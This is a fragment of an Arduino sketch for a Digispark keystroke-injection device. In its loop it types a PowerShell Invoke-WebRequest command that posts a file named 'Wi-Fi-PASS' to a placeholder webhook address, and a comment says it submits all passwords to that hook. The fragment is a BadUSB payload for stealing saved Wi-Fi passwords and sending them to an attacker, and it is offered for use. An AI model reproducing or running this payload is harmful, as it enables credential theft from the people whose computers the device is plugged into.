...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri  ADD-YOURWEBHOOK -ContentType 'text/xml' -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
